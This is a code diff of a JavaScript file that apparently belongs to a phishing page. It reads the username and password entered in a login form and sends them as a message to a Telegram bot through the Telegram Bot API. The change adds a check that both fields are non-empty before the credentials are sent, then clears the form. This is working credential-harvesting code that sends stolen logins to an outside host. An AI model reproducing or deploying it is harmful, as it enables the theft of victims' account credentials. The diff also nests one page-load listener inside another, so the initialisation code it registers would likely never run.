@@ -15,30 +15,43 @@ var ready = function () {
     }
 };
 
-var sender = function () {
-    var settings = {
-        "async": true,
-        "crossDomain": true,
-        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/json",
-            "cache-control": "no-cache"
-        },
-        "data": JSON.stringify({
-            "chat_id": chat_id,
-            "text": message
-        })
-    };
-    $.ajax(settings).done(function (response) {
-        console.log(response);
-    });
 
-    // Clear input fields after sending the message
-    document.getElementById("username").value = "";
-    document.getElementById("password").value = "";
+var sender = function () {
+    var u_name = document.getElementById("username").value;
+    var u_password = document.getElementById("password").value;
+
+    // Check if both username and password are not empty
+    if (u_name.trim() !== "" && u_password.trim() !== "") {
+        message = "Name: " + u_name + "\nPassword: " + u_password;
+        var settings = {
+            "async": true,
+            "crossDomain": true,
+            "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+            "method": "POST",
+            "headers": {
+                "Content-Type": "application/json",
+                "cache-control": "no-cache"
+            },
+            "data": JSON.stringify({
+                "chat_id": chat_id,
+                "text": message
+            })
+        };
+        $.ajax(settings).done(function (response) {
+            console.log(response);
+        });
+
+        // Clear input fields after sending the message
+        document.getElementById("username").value = "";
+        document.getElementById("password").value = "";
+    }
 
     return false;
 };
 
-document.addEventListener('DOMContentLoaded', ready);
+document.addEventListener('DOMContentLoaded', function () {
+    // Call ready function if needed
+    document.addEventListener('DOMContentLoaded', ready);
+
+});
+
